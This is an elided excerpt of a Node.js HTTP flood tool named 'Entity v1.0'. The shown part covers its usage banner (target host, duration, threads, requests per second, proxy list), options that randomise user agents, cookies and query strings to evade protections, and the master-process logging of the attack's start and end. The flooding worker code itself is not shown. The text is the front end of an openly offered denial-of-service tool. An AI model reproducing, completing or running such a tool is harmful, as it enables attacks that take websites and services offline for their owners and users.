...
if (process.argv.length == 2) {
    log(`(` + `Its a Entity`.cyan + `)` + ` ` + `Entity v1.0`);
    log(`(` + `Entity Info`.blue + `)` + ` ` + `Usage:` + ` ` + `node ${file} <host> <time> <threads> <rps> <proxies>`.blue);
    log(`(` + `Entity Info`.blue + `)` + ` ` + `Optinal arguments:`);
    log(`(` + `Entity Info`.blue + `)` + ` ` + ` --debug=<true>`.blue + ` - ` + `Prints debug information ` + `(def: disable)`.gray);
    log(`(` + `Entity Info`.blue + `)` + ` ` + ` --ua=<linux/windows/macos/android/ios/all>`.blue + ` - ` + `UA selection ` + `(def: all)`.gray);
    log(`(` + `Entity Info`.blue + `)` + ` ` + ` --cookies=<true>`.blue + ` - ` + ` Generates a random Cookies ` + `(def: disable)`.gray);
    log(`(` + `Entity Info`.blue + `)` + ` ` + ` --querystring=<true>`.blue + ` - ` + `Generates a random Query String ` + `(def: disable)`.gray);
    log(`(` + `Entity Info`.blue + `)` + ` ` + ` --delay=<delay in ms>`.blue + ` - ` + `Delay before a new flood ` + `(def: 0 [ms])`.gray);
    log(`(` + `Entity Info`.blue + `)` + ` ` + ` --interval=<true>`.blue + ` - ` + `More R/S, but some protections can filter ` + `(def: true)`.gray);
    log(`(` + `Entity Info`.blue + `)` + ` ` + `Example:` + ` ` + `node ${file} https://shitflare.asia 60 10 64 proxy.txt --debug=true --ua=windows --querystring=true`.blue);
    process.exit(1);
}

if (process.argv.length < 6) {
    log(`(` + `Entity Info`.blue + `)` + ` ` + `Incorrect usage!`);
    log(`(` + `Entity Info`.blue + `)` + ` ` + `Usage:` + ` ` + `node ${file} <host> <time> <threads> <rps> <proxies>`.blue);
    log(`(` + `Entity Info`.blue + `)` + ` ` + `Optinal arguments:`);
    log(`(` + `Entity Info`.blue + `)` + ` ` + ` --debug=<true>`.blue + ` - ` + `Prints debug information ` + `(def: disable)`.gray);
    log(`(` + `Entity Info`.blue + `)` + ` ` + ` --ua=<linux/windows/macos/android/ios/all>`.blue + ` - ` + `UA selection ` + `(def: all)`.gray);
...
if (cluster.isMaster) {
    ...
    log(`(` + `Entity Debug`.brightBlue + `)` + ` ` + `Attack Successfully started!`);
    log(`(` + `Entity Debug`.brightBlue + `)` + ` ` + `Target: ` + `${process.argv[2]}`.brightBlue + ` | Duration: ` + `${process.argv[3]} sec.`.brightBlue + ` | Threads: ` + `${process.argv[4]}`.brightBlue + ` | RPS: ` + `${process.argv[5]}`.brightBlue);
    log(`(` + `Entity Debug`.brightBlue + `)` + ` ` + `Optinal arguments:`);
    log(`(` + `Entity Debug`.brightBlue + `)` + ` ` + ` --debug: `.brightBlue + `${debug}`);
    log(`(` + `Entity Debug`.brightBlue + `)` + ` ` + ` --ua: `.brightBlue + `${ua}`);
    log(`(` + `Entity Debug`.brightBlue + `)` + ` ` + ` --cookies: `.brightBlue + `${cookiesT}`);
    log(`(` + `Entity Debug`.brightBlue + `)` + ` ` + ` --querystring: `.brightBlue + `${querystringT}`);
    log(`(` + `Entity Debug`.brightBlue + `)` + ` ` + ` --delay: `.brightBlue + `${delay}`);
    log(`(` + `Entity Debug`.brightBlue + `)` + ` ` + ` --interval: `.brightBlue + `${intervalAttack}`);

    setTimeout(() => {
        log(`(` + `Entity Debug`.brightBlue + `)` + ` ` + `Attack is over.`);
        process.exit();
    }, timeT * 1000);
} else {
